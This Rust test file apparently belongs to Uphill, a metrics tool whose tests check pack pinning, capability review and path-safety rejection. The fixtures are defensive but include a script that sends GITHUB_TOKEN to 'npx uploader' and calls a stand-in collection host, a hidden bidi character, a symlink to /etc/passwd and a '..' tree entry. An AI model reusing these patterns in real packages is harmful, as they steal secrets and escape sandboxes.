        "own:\n  run: echo \"files 2\" >> \"$UPHILL_METRICS\"\n  files: {}\n",
    )
    .unwrap();
    dir
}

/// Replaces the number of days before each `days old` in `text` with `N`, since the age of a
/// fixed commit grows with the clock.
fn aged(text: &str) -> String {
    text.split(" days old")
        .map(|part| part.trim_end_matches(|c: char| c.is_ascii_digit()))
        .collect::<Vec<_>>()
        .join("N days old")
}

/// Replaces each full and short commit in `text` with its label.
fn commits(text: &str, labels: &[(&str, &str)]) -> String {
    labels
        .iter()
        .fold(text.to_owned(), |text, (commit, label)| {
            text.replace(commit, label)
                .replace(commit.get(..7).unwrap(), label)
        })
}

#[test]
fn add_pins_a_pack_that_runs_from_the_cache() {
    let host = Host::new();
    let project = packed_project();
    let first = git(&host.repository(), &["rev-parse", "HEAD"]);
    let first = first.trim();

    // Without a terminal on standard input, nothing is written until `--yes`.
    let output = uphill_in(
        project.path(),
        &["add", "acme/packs/sizes@main"],
        &host.envs(),
    );
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"error: standard input is not a terminal, so nothing was written. Review the summary above, then run again with --yes");
    assert!(!host.cache().exists());

    let output = uphill_in(
        project.path(),
        &["add", "acme/packs/sizes@main", "--yes"],
        &host.envs(),
    );
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    let text = stdout(&output);
    let text = commits(&text, &[(first, "<first>")]);
    let text = aged(&text);
    insta::assert_snapshot!(text, @"
    sizes  acme/packs/sizes@<first> (main, N days old)
    files  5 (731 B)
      .agents/metrics/lib.sh
      .agents/metrics/lines.sh
      .agents/metrics/sizes.sh
      .agents/uphill.baseline.yaml
      .agents/uphill.yaml
    capabilities
      info  environment   UPHILL_METRICS  .agents/metrics/lines.sh:3
      info  process       sh              .agents/uphill.yaml:3

    Added acme/packs/sizes to uphill.yaml
    Wrote .agents/uphill/rules.md, AGENTS.md

    Commit these files, then run `uphill check`
    ");

    let config = fs::read_to_string(project.path().join("uphill.yaml")).unwrap();
    insta::assert_snapshot!(commits(&config, &[(first, "<first>")]), @r#"
    own:
      run: echo "files 2" >> "$UPHILL_METRICS"
      files: {}

    packs:
      - acme/packs/sizes@<first> # main
    "#);
    // The project holds its configuration and the rules that AGENTS.md mentions, and the pack's
    // files are in the cache.
    let names = |dir: &Path| {
        let mut names: Vec<_> = fs::read_dir(dir)
            .unwrap()
            .map(|item| item.unwrap().file_name())
            .collect();
        names.sort();
        names
    };
    assert_eq!(
        names(project.path()),
        [".agents", "AGENTS.md", "uphill.yaml"]
    );
    assert_eq!(names(&project.path().join(".agents/uphill")), ["rules.md"]);
    assert_eq!(names(&project.path().join(".agents")), ["uphill"]);
    assert!(
        host.cached(first)
            .join(".agents/metrics/sizes.sh")
            .is_file()
    );

    // A run with an empty cache fetches the pinned commit.
    fs::remove_dir_all(host.cache()).unwrap();
    let output = check(project.path(), &host.envs());
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(stdout(&output), @"
    ✓ own        1 metric
    ✓ footprint  1 metric
    ✓ lines      1 metric

    3 passed
    ");
    assert!(
        host.cached(first)
            .join(".agents/metrics/sizes.sh")
            .is_file()
    );

    // A cached commit needs no network. Without the cache, the fetch fails.
    fs::rename(host.repository(), host.dir.path().join("moved")).unwrap();
    let output = check(project.path(), &host.envs());
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    fs::remove_dir_all(host.cache()).unwrap();
    let output = check(project.path(), &host.envs());
    assert_eq!(output.status.code(), Some(2));
    assert!(
        stderr(&output)
            .starts_with("error: could not fetch acme/packs/sizes: `git ls-remote` failed"),
        "{}",
        stderr(&output)
    );
    fs::rename(host.dir.path().join("moved"), host.repository()).unwrap();

    // `remove` takes the entry away.
    let output = uphill_in(project.path(), &["remove", "sizes"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(stdout(&output), @"
    Removed acme/packs/sizes from uphill.yaml
    Wrote .agents/uphill/rules.md
    ");

    // A TOML project takes the entry before its first table, apart from the table's comment.
    fs::remove_file(project.path().join("uphill.yaml")).unwrap();
    let host = Host::new();
    let first = git(&host.repository(), &["rev-parse", "HEAD"]);
    let first = first.trim();
    fs::write(
        project.path().join("uphill.toml"),
        "# Files of this project.\n[own]\nrun = \"echo 'files 2' >> \\\"$UPHILL_METRICS\\\"\"\nfiles = {}\n",
    )
    .unwrap();
    let output = uphill_in(
        project.path(),
        &["add", "acme/packs/sizes@main", "lines", "--yes"],
        &host.envs(),
    );
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    let config = fs::read_to_string(project.path().join("uphill.toml")).unwrap();
    insta::assert_snapshot!(commits(&config, &[(first, "<first>")]), @r#"
    packs = [
      { pack = "acme/packs/sizes@<first>", categories = ["lines"] }, # main
    ]

    # Files of this project.
    [own]
    run = "echo 'files 2' >> \"$UPHILL_METRICS\""
    files = {}
    "#);
    let output = check(project.path(), &host.envs());
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
}

#[test]
fn update_reviews_new_capabilities_and_refuses_fresh_and_force_pushed_commits() {
    let host = Host::new();
    let project = packed_project();
    let first = git(&host.repository(), &["rev-parse", "HEAD"]);
    let first = first.trim().to_owned();
    let output = uphill_in(
        project.path(),
        &["add", "acme/packs/sizes", "--yes"],
        &host.envs(),
    );
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));

    // A new script runs code from the network and reads a token.
    fs::write(
        host.repository().join("sizes/.agents/metrics/upload.ts"),
        "const token = process.env.GITHUB_TOKEN\nBun.spawnSync(['npx', 'uploader', token])\nawait fetch('https://collect.example.com/runs')\n// admin\u{202e} \u{2066}// check\n",
    )
    .unwrap();
    fs::write(
        host.repository().join("sizes/.agents/metrics/helper.wasm"),
        b"\0asm\x01\0\0\0",
    )
    .unwrap();
    let second = host.commit("2026-02-01T00:00:00Z");

    let output = uphill_in(project.path(), &["update", "--yes"], &host.envs());
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    let text = commits(
        &stdout(&output),
        &[(&first, "<first>"), (&second, "<second>")],
    );
    let text = aged(&text);
    insta::assert_snapshot!(text, @"
    sizes  <first> → <second> (N days old)
    files  +2 ~0 -0 (892 B)
      + .agents/metrics/helper.wasm
      + .agents/metrics/upload.ts
    capabilities
    + high  remote code   npx                           .agents/metrics/upload.ts:2
    + high  secret        GITHUB_TOKEN                  .agents/metrics/upload.ts:1
    + high  unreviewable  binary file                   .agents/metrics/helper.wasm
    + high  unreviewable  bidi or zero-width character  .agents/metrics/upload.ts:4
      info  environment   UPHILL_METRICS                .agents/metrics/lines.sh:3
    + info  network       fetch(                        .agents/metrics/upload.ts:3
    + info  network       collect.example.com           .agents/metrics/upload.ts:3
    + info  process       Bun.spawn                     .agents/metrics/upload.ts:2
    + info  process       npx                           .agents/metrics/upload.ts:2
      info  process       sh                            .agents/uphill.yaml:3
    updated  acme/packs/sizes to <second>
    ");
    let config = fs::read_to_string(project.path().join("uphill.yaml")).unwrap();
    assert!(
        config.contains(&format!("acme/packs/sizes@{second}\n")),
        "{config}"
    );
    assert!(
        host.cached(&second)
            .join(".agents/metrics/upload.ts")
            .is_file()
    );

    // A commit from today waits a day, unless `--allow-fresh`.
    fs::write(host.repository().join("sizes/new.txt"), "new\n").unwrap();
    git(&host.repository(), &["add", "-A"]);
    git(&host.repository(), &["commit", "-q", "-m", "fresh"]);
    let fresh = git(&host.repository(), &["rev-parse", "HEAD"]);
    let output = uphill_in(project.path(), &["update", "--yes"], &host.envs());
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(commits(&stderr(&output), &[(fresh.trim(), "<fresh>")]), @"error: the commit <fresh> is less than a day old. Wait for review of the change, or run again with --allow-fresh");

    // A force-push replaces the pinned commit's history.
    git(&host.repository(), &["reset", "-q", "--hard", &first]);
    fs::write(host.repository().join("sizes/other.txt"), "other\n").unwrap();
    let forced = host.commit("2026-03-01T00:00:00Z");
    let output = uphill_in(project.path(), &["update", "--yes"], &host.envs());
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(
        commits(&stderr(&output), &[(&second, "<second>"), (&forced, "<forced>")]),
        @"error: acme/packs/sizes at <forced> does not descend from the pinned commit <second>. The ref may have been force-pushed, or the repository replaced. Review it, then run `uphill remove sizes` and `uphill add`"
    );
}

#[test]
fn add_rejects_links_escaping_paths_fork_commits_and_ambiguous_refs() {
    let host = Host::new();
    let project = packed_project();
    let repository = host.repository();
    let add = |source: &str| {
        let output = uphill_in(project.path(), &["add", source, "--yes"], &host.envs());
        assert_eq!(output.status.code(), Some(2), "{}", stdout(&output));
        assert!(!host.cache().exists());
        stderr(&output)
    };

    // A symbolic link that points out of the pack.
    git(&repository, &["checkout", "-q", "-b", "link"]);
    std::os::unix::fs::symlink("/etc/passwd", repository.join("sizes/passwd")).unwrap();
    let link = host.commit("2026-02-01T00:00:00Z");
    insta::assert_snapshot!(commits(&add("acme/packs/sizes@link"), &[(&link, "<link>")]), @"error: acme/packs/sizes at <link> is unsafe: passwd is a symbolic link");

    // A tree with a `..` entry, which Git's own commands never write.
    git(&repository, &["checkout", "-q", "main"]);
    let blob = git(
        &repository,
        &["rev-parse", "HEAD:sizes/.agents/uphill.yaml"],
    );
    let inner = command_in(
        &repository,
        &["mktree"],
        &format!("100644 blob {}\tescape.sh\n", blob.trim()),
    );
    let pack = command_in(
        &repository,
        &["mktree"],
        &format!(
            "040000 tree {inner}\t..\n100644 blob {}\tuphill.yaml\n",
            blob.trim()
        ),
    );
    let root = command_in(
        &repository,
        &["mktree"],
        &format!("040000 tree {pack}\tsizes\n"),
    );
    let commit = command_in(
        &repository,
        &["commit-tree", &root, "-p", "HEAD", "-m", "escape"],
        "",
    );
    git(&repository, &["update-ref", "refs/heads/escape", &commit]);
    insta::assert_snapshot!(commits(&add("acme/packs/sizes@escape"), &[(&commit, "<escape>")]), @"error: acme/packs/sizes at <escape> is unsafe: the path ../escape.sh is not allowed");

    // A commit that no branch or tag reaches, as a fork's commit is through its parent.
    git(&repository, &["checkout", "-q", "-b", "fork"]);
    fs::write(repository.join("sizes/fork.txt"), "fork\n").unwrap();
    let fork = host.commit("2026-02-02T00:00:00Z");
    git(&repository, &["update-ref", "refs/pull/1/head", &fork]);
    git(&repository, &["checkout", "-q", "main"]);
    git(&repository, &["branch", "-q", "-D", "fork"]);
    insta::assert_snapshot!(commits(&add(&format!("acme/packs/sizes@{fork}")), &[(&fork, "<fork>")]), @"error: no branch or tag of acme/packs/sizes contains the commit <fork>. It may come from a fork");

    // A run fetches a pin written by hand with the same checks, and caches nothing it rejects.
    let path = project.path().join("uphill.yaml");
    let config = fs::read_to_string(&path).unwrap();
    fs::write(&path, format!("{config}packs: [acme/packs/sizes@{fork}]\n")).unwrap();
    let output = check(project.path(), &host.envs());
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(commits(&stderr(&output), &[(&fork, "<fork>")]), @"error: no branch or tag of acme/packs/sizes contains the commit <fork>. It may come from a fork");
    assert!(!host.cache().exists());
    fs::write(&path, config).unwrap();

    // A ref that names both a branch and a tag.
    git(&repository, &["tag", "v1"]);
    git(&repository, &["branch", "v1"]);
    insta::assert_snapshot!(add("acme/packs/sizes@v1"), @"error: `v1` names both a branch and a tag in acme/packs/sizes. Name a full commit instead");

    // Sources that are not GitHub paths or `https` URLs.
    insta::assert_snapshot!(add("http://example.com/acme/packs.git//sizes"), @"error: `http://example.com/acme/packs.git//sizes` is not a pack source: use `owner/repo/path` on GitHub or an `https` URL followed by `//path`, each with an optional `@ref`");
    insta::assert_snapshot!(add("acme/packs/../sizes"), @"error: `../sizes` is not a path in a repository: use `owner/repo/path` on GitHub or an `https` URL followed by `//path`, each with an optional `@ref`");
}

#[test]
fn packs_merge_categories_with_the_same_name() {
    let dir = tempfile::tempdir().unwrap();
    let write = |path: &str, text: &str| {
        let path = dir.path().join(path);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, text).unwrap();
    };
    // Two packs share `style` and its `formatted` metric, and only the first declares `docs`.
    write(
        "packs/a/uphill.yaml",
        "run: sh a.sh\nstyle:\n  formatted: {}\n  long-lines: {}\ndocs:\n  module-docs: {}\n",
    );
    write(
        "packs/a/a.sh",
        "printf 'formatted a.rs pass\\nformatted b.rs fail\\nlong-lines a.rs pass\\nmodule-docs a.rs pass\\n' >> \"$UPHILL_METRICS\"\n",
    );
    write(
        "packs/b/uphill.yaml",
        "style:\n  title: Code Style\n  run: sh b.sh\n  formatted: { weight: 9 }\n  nested-ternaries: {}\n",
    );
    write(
        "packs/b/b.sh",
        "printf 'formatted c.ts pass\\nnested-ternaries c.ts pass\\n' >> \"$UPHILL_METRICS\"\n",
    );
    // The project adds a metric with its own script, and weighs a pack's metric.
    write(
        "uphill.yaml",
        "packs:\n  - ./packs/a\n  - ./packs/b\nstyle:\n  run: echo 'spelling pass' >> \"$UPHILL_METRICS\"\n  spelling: {}\n  long-lines: { weight: 2 }\n",
    );

    let output = uphill_in(dir.path(), &["--compact"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(stdout(&output), @"
    style 93, docs 100

    Missed targets
      style  formatted b.rs  fail

    Opportunities
      +7  style  formatted b.rs  fail → pass

    No baseline yet. Run `uphill --update` to record these values as the baseline.

    Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html
    ");
    // Without `--compare`, `comment.md` has one gauge per category, in declared order.
    insta::assert_snapshot!(fs::read_to_string(dir.path().join(".uphill/comment.md")).unwrap(), @r#"
    ## Uphill

    <table><tr><th align="left">Category</th><th>This run</th></tr><tr><td><b>Code Style</b></td><td align="center"><img src="https://raw.githubusercontent.com/wevm/uphill/main/assets/gauges/93.svg" width="48" height="48" alt="Code Style: 93"></td></tr><tr><td><b>Docs</b></td><td align="center"><img src="https://raw.githubusercontent.com/wevm/uphill/main/assets/gauges/100.svg" width="48" height="48" alt="Docs: 100"></td></tr></table>
    "#);

    let output = check(dir.path(), &[]);
    insta::assert_snapshot!(stdout(&output), @"
    ✓ style  4 metrics
    ✓ docs   1 metric

    2 passed
    ");

    // Two scripts that write the same item of a merged metric fail the category.
    write(
        "packs/b/b.sh",
        "printf 'formatted a.rs pass\\nnested-ternaries c.ts pass\\n' >> \"$UPHILL_METRICS\"\n",
    );
    let output = check(dir.path(), &[]);
    assert_eq!(output.status.code(), Some(1));
    insta::assert_snapshot!(stdout(&output), @"
    ✗ style  item `a.rs` of metric `formatted` is written by two scripts of `style`
    ✓ docs   1 metric

    1 passed, 1 failed
    ");

    // `--update` reads the packs, so a project category that drops a pack's metric still parses.
    write(
        "uphill.yaml",
        "packs:\n  - ./packs/a\nstyle:\n  long-lines: false\n",
    );
    let output = uphill_in(dir.path(), &["--update", "--compact"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(stdout(&output), @"
    style 50, docs 100

    Missed targets
      style  formatted b.rs  fail

    Opportunities
      +50  style  formatted b.rs  fail → pass

    Since the baseline
      new  style  formatted
      new  docs   module-docs

    Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html, uphill.baseline.yaml
    ");

    // A project category that only adjusts a pack's metrics cannot replace its script.
    write(
        "uphill.yaml",
        "packs:\n  - ./packs/a\ndocs:\n  run: echo\n  module-docs: { weight: 2 }\n",
    );
    let output = check(dir.path(), &[]);
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"
    error[unexpected-key] uphill.yaml:4:3: `run` runs the metrics that `docs` adds, and it adds none. A pack's metrics keep the pack's script
      4 |   run: echo
        |   ^
    ");
}

#[test]
fn packs_must_be_pinned_allowed_and_approved_to_install() {
    let host = Host::new();
    let project = packed_project();
    let output = uphill_in(
        project.path(),
        &["add", "acme/packs/sizes", "--yes"],
        &host.envs(),
    );
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    let path = project.path().join("uphill.yaml");
    let config = fs::read_to_string(&path).unwrap();
    let first = git(&host.repository(), &["rev-parse", "HEAD"]);
    let first = first.trim();

    fs::write(&path, config.replace(first, "main")).unwrap();
    let output = check(project.path(), &host.envs());
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"
    error[unpinned] uphill.yaml:6:5: pack `acme/packs/sizes` must be pinned to a full commit, such as `acme/packs/sizes@<40-character commit>`. `uphill add acme/packs/sizes` writes the pin
      6 |   - acme/packs/sizes@main
        |     ^
    ");

    fs::write(&path, format!("{config}allowed-packs: [wevm/*]\n")).unwrap();
    let output = check(project.path(), &host.envs());
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(commits(&stderr(&output), &[(first, "<first>")]), @"
    error[not-allowed] uphill.yaml:6:5: pack `acme/packs/sizes` matches no pattern of `allowed-packs`: wevm/*
      6 |   - acme/packs/sizes@<first>
        |     ^
    ");

    // A package.json installs only with `install: true`, and only from a lockfile.
    fs::write(host.cached(first).join("package.json"), "{}\n").unwrap();
    fs::write(&path, &config).unwrap();
    let output = check(project.path(), &host.envs());
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    let pinned = format!("acme/packs/sizes@{first}");
    fs::write(
        &path,
        config.replace(&pinned, &format!("{{ pack: {pinned}, install: true }}")),
    )
    .unwrap();
    let output = check(project.path(), &host.envs());
    assert_eq!(output.status.code(), Some(2));
    let cache = host.cache().display().to_string();
    insta::assert_snapshot!(commits(&stderr(&output).replace(&cache, "<cache>"), &[(first, "<first>")]), @"error: pack <cache>/uphill/packs/<first>/sizes has a package.json without a lockfile, so Uphill does not install it");

    // A new entry goes after an entry written as a mapping.
    fs::create_dir(project.path().join("local")).unwrap();
    fs::write(
        project.path().join("local/uphill.yaml"),
        "local:\n  run: echo \"files 1\" >> \"$UPHILL_METRICS\"\n  files: {}\n",
    )
    .unwrap();
    let output = uphill_in(project.path(), &["add", "./local"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    let config = fs::read_to_string(&path).unwrap();
    insta::assert_snapshot!(commits(&config, &[(first, "<first>")]), @r#"
    own:
      run: echo "files 2" >> "$UPHILL_METRICS"
      files: {}

    packs:
      - { pack: acme/packs/sizes@<first>, install: true }
      - ./local
    "#);
}

/// Runs Git in `dir` with `input` on standard input, and returns its output without the newline.
fn command_in(dir: &Path, args: &[&str], input: &str) -> String {
    use std::io::Write as _;
    let mut child = Command::new("git")
        .args([
            "-c",
            "user.name=Uphill",
            "-c",
            "user.email=uphill@example.com",
        ])
        .args(args)
        .env("GIT_AUTHOR_DATE", "2026-02-03T00:00:00Z")
        .env("GIT_COMMITTER_DATE", "2026-02-03T00:00:00Z")
        .current_dir(dir)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(input.as_bytes())
        .unwrap();
    let output = child.wait_with_output().unwrap();
    assert!(output.status.success());
    stdout(&output).trim().to_owned()
}

#[test]
fn rejects_an_invalid_baseline() {
    let project = fixture("scored");
    fs::write(
        project.path().join("uphill.baseline.yaml"),
        "footprint:\n  bundle: 27.5 kilobytes\n",
    )
    .unwrap();

    let output = uphill_in(project.path(), &["footprint"], &[]);

    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"
    error[invalid-value] uphill.baseline.yaml:2:11: expected `{ baseline: <value>, target: <value> }` with either key or both, or a mapping of items, patterns, or subjects to them. A baseline is a size, count, or check, and a target is a size, time, or count
      2 |   bundle: 27.5 kilobytes
        |           ^
    ");
}

#[test]
fn update_writes_a_toml_baseline_file_and_moves_inline_baselines_into_it() {
    let project = fixture("passing");
    let path = project.path().join("uphill.toml");
    let config = "[footprint]\nrun = \"sh metrics/footprint.sh\"\nexport-size.target = \"5kB\" # gzipped\nmodules = { baseline = 400 }\n\n[speed]\nrun = \"sh metrics/speed.sh\"\n\n[speed.render]\ntarget = \"2ms\" # per item\n\n[speed.render.targets]\n\"ABI*\" = \"3ms\"\n";
    fs::write(&path, config).unwrap();
    let speed = project.path().join("metrics/speed.sh");
    let script = fs::read_to_string(&speed).unwrap();
    fs::write(
        &speed,
        script.replace("render encode 236us", "render encode 236us target 300us"),
    )
    .unwrap();

    // The inline targets and baseline move into the baseline file, including a dotted key and a
    // key in a metric's own table. A metric with items takes a table of its own, one line per
    // item.
    let output = uphill_in(project.path(), &["--update"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    assert!(
        stdout(&output).ends_with(
            "\nWrote .uphill/report.json, .uphill/report.md, .uphill/report.html, uphill.baseline.toml, uphill.toml\n"
        ),
        "{}",
        stdout(&output)
    );
    assert_eq!(
        fs::read_to_string(&path).unwrap(),
        config
            .replace("export-size.target = \"5kB\"", "export-size = {}")
            .replace("modules = { baseline = 400 }", "modules = {}")
            .replace(
                "target = \"2ms\" # per item\n\n[speed.render.targets]\n\"ABI*\" = \"3ms\"\n",
                ""
            )
    );
    let baselines = fs::read_to_string(project.path().join("uphill.baseline.toml")).unwrap();
    insta::assert_snapshot!(baselines, @r#"
    # Each measurement's `baseline`, the size, count, or check `uphill --update` accepted, and its
    # `target`. Edit a target here, and each run reports what changed since the baseline.

    [footprint]
    modules = { baseline = 412 }

    [footprint.export-size]
    "*" = { target = "5kB" }
    viem = { baseline = "4.2kB" }
    "viem/chains" = { baseline = "61kB" }

    [speed.render]
    "*" = { target = "2ms" }
    "ABI*" = { target = "3ms" }
    encode = { target = "300µs" }
    "#);

    // Without its line target, the timing keeps the target the baseline file records.
    fs::write(&speed, script).unwrap();
    let output = uphill_in(project.path(), &["--update"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    assert_eq!(
        fs::read_to_string(project.path().join("uphill.baseline.toml")).unwrap(),
        baselines
    );
}

#[test]
fn update_that_records_nothing_writes_no_baseline_file() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("uphill.yaml"),
        "speed:\n  run: \"true\"\n  startup: {}\n",
    )
    .unwrap();

    // The script writes no metric line, so there is no target or value to write, and no
    // baseline file to remove.
    let output = uphill_in(dir.path(), &["--update"], &[]);

    insta::assert_snapshot!(stderr(&output), @"");
    assert!(!dir.path().join("uphill.baseline.yaml").exists());
}

#[test]
fn unknown_category() {
    let project = fixture("scored");

    let output = uphill_in(project.path(), &["bench"], &[]);

    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"error: unknown category 'bench'. uphill.yaml declares footprint, speed");
}

#[test]
fn rules_list_each_composed_metric_with_its_description_and_targets() {
    let dir = tempfile::tempdir().unwrap();
    let write = |path: &str, text: &str| {
        let path = dir.path().join(path);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, text).unwrap();
    };
    // The pack's rules span two lines, and one of them is dropped by the project.
    write(
        "packs/a/uphill.yaml",
        "run: sh a.sh\nstyle:\n  formatted:\n    description: Format each file\n      with the project's formatter.\n  enums:\n    description: Use unions, not enums.\n  long-lines: { description: Keep lines short. }\n",
    );
    // A second pack shares `formatted`, so both rules apply to the merged metric.
    write(
        "packs/b/uphill.yaml",
        "run: sh b.sh\nstyle:\n  formatted: { description: Format each TypeScript file. }\n",
    );
    // The project adds a category before the packs', rewrites one pack rule, and drops another.
    write(
        "uphill.yaml",
        "packs:\n  - ./packs/a\n  - ./packs/b\nspeed:\n  description: Time of each public call.\n  run: \"true\"\n  parse-time: { description: Parse in one pass. }\n  throughput: { better: higher, description: Serve each request in one pass. }\n  startup: {}\nstyle:\n  enums: { description: \"Use `as const` objects, not enums.\" }\n  long-lines: false\n",
    );
    // The baseline sets a default target and an item pattern, which follow each rule.
    write(
        "uphill.baseline.yaml",
        "speed:\n  parse-time:\n    \"*\": { target: 120µs }\n    \"large/*\": { target: 4ms }\n  throughput: { target: 2000 }\n",
    );

    let output = uphill_in(dir.path(), &["rules"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(stdout(&output), @"
    # Rules

    Uphill writes these rules from each metric's `description`. Write code that meets them. `uphill` scores each metric against its target, and `uphill --compare HEAD --compact` lists what a change made worse.

    ## Speed

    Time of each public call.

    - Parse in one pass. At most 120 µs. `large/*`: at most 4 ms.
    - Serve each request in one pass. At least 2000.

    ## Style

    - Format each file with the project's formatter. Format each TypeScript file.
    - Use `as const` objects, not enums.
    ");

    let output = uphill_in(dir.path(), &["rules", "style"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(stdout(&output), @"
    # Rules

    Uphill writes these rules from each metric's `description`. Write code that meets them. `uphill` scores each metric against its target, and `uphill --compare HEAD --compact` lists what a change made worse.

    ## Style

    - Format each file with the project's formatter. Format each TypeScript file.
    - Use `as const` objects, not enums.
    ");

    let output = uphill_in(dir.path(), &["rules", "docs"], &[]);
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"error: unknown category 'docs'. uphill.yaml declares speed, style");
}

#[test]
fn rules_write_a_file_that_agents_md_mentions_and_check_fails_when_it_is_stale() {
    let project = fixture("scored");
    let dir = project.path();
    let agents = dir.join("AGENTS.md");
    fs::write(&agents, "# Project\n\nRun `make test`.\n").unwrap();

    // The mention goes under the title, above the project's own guidance.
    let output = uphill_in(dir, &["rules", "--write"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(stdout(&output), @"Wrote .agents/uphill/rules.md, AGENTS.md");
    insta::assert_snapshot!(fs::read_to_string(&agents).unwrap(), @"
    # Project

    Follow the [Uphill rules](.agents/uphill/rules.md), which `uphill rules --write` rewrites from each metric's description: @.agents/uphill/rules.md

    Run `make test`.
    ");
    assert_eq!(
        fs::read_to_string(dir.join(".agents/uphill/rules.md")).unwrap(),
        stdout(&uphill_in(dir, &["rules"], &[]))
    );

    // A second write changes nothing, and the mention stays single.
    let output = uphill_in(dir, &["rules", "--write"], &[]);
    insta::assert_snapshot!(stdout(&output), @".agents/uphill/rules.md is up to date");
    assert_eq!(
        fs::read_to_string(&agents)
            .unwrap()
            .matches("@.agents")
            .count(),
        1
    );

    // A new description makes the file stale, which fails `uphill check` until the next write.
    let config = fs::read_to_string(dir.join("uphill.yaml")).unwrap();
    fs::write(
        dir.join("uphill.yaml"),
        config.replace("render: {}", "render: { description: Render in one pass. }"),
    )
    .unwrap();
    let output = check(dir, &[]);
    assert_eq!(output.status.code(), Some(1));
    insta::assert_snapshot!(stdout(&output), @"
    ✓ footprint  4 metrics
    ✓ speed      2 metrics
    ✗ .agents/uphill/rules.md is out of date. Run `uphill rules --write`

    2 passed, 1 failed
    ");
    uphill_in(dir, &["rules", "--write"], &[]);
    assert_eq!(check(dir, &[]).status.code(), Some(0));

    let output = uphill_in(dir, &["rules", "--write", "speed"], &[]);
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"error: --write writes the rules of every category, so it takes no category");
}

#[test]
fn check_passes_from_a_subdirectory() {
    let project = fixture("passing");

    let output = check(&project.path().join("metrics"), &[]);

    assert_eq!(output.status.code(), Some(0));
    insta::assert_snapshot!(stdout(&output), @"
    ✓ footprint  2 metrics
    ✓ speed      1 metric

    2 passed
    ");
    insta::assert_snapshot!(stderr(&output), @"");
}

#[test]
fn check_reports_failed_scripts_with_the_end_of_stderr() {
    let project = fixture("failing");

    let output = check(project.path(), &[]);

    assert_eq!(output.status.code(), Some(1));
    insta::assert_snapshot!(stdout(&output), @"
    ✓ footprint  1 metric
    ✗ build      script exited with status 3
        build log line 6
        build log line 7
        build log line 8
        build log line 9
        build log line 10
        build log line 11
        build log line 12
        build log line 13
        build log line 14
        build log line 15
        build log line 16
        build log line 17
        build log line 18
        build log line 19
        build log line 20
        build log line 21
        build log line 22
        build log line 23
        build log line 24
        build log line 25
    ✗ crash      script was stopped by signal 9

    1 passed, 2 failed
    ");
}

#[test]
fn check_reports_a_malformed_line() {
    let project = fixture("malformed");

    let output = check(project.path(), &[]);

    assert_eq!(output.status.code(), Some(1));
    insta::assert_snapshot!(stdout(&output), @r#"
    ✗ footprint  invalid metric line
        error[unknown-unit] footprint metrics:2:29: unknown unit `kb`, expected one of `B`, `kB`, `MB`, `GB`, `ns`, `µs`, `us`, `ms`, `s`
          2 | export-size "viem/chains" 61kb
            |                             ^

    0 passed, 1 failed
    "#);
}

#[test]
fn check_reports_missing_and_unconfigured_metrics() {
    let project = fixture("missing");

    let output = check(project.path(), &[]);

    assert_eq!(output.status.code(), Some(1));
    insta::assert_snapshot!(stdout(&output), @"
    ✗ footprint  2 metrics, 1 error, 1 warning
        error[metric-missing] uphill.yaml:5:3: metric `modules` is configured, but the script did not write it
          5 |   modules: {}
            |   ^
        warning[unconfigured-metric] footprint metrics:2:1: metric `chunks` is written, but `footprint` does not configure it
          2 | chunks 9
            | ^

    0 passed, 1 failed
    ");
}

#[test]
fn check_points_into_the_baseline_file_for_its_targets() {
    let project = fixture("scored");
    fs::write(
        project.path().join("uphill.baseline.yaml"),
        "footprint:\n  export-size:\n    \"*\": { target: 5kB }\n    \"viem/tempo/*\": { target: 1kB }\n    viem: target 2ms\n",
    )
    .unwrap();

    // A pattern that matches no item warns at its line, and an item's own target in the wrong
    // unit, here in the short form of older files, names the item.
    let output = check(project.path(), &[]);

    insta::assert_snapshot!(stdout(&output), @r#"
    ✗ footprint  4 metrics, 1 error, 1 warning
        error[target-unit] uphill.baseline.yaml: metric `export-size` is written as sizes, but its target for `viem` is a time
        warning[unmatched-pattern] uphill.baseline.yaml:4:5: pattern `viem/tempo/*` in the targets of metric `export-size` matches no item
          4 |     "viem/tempo/*": { target: 1kB }
            |     ^
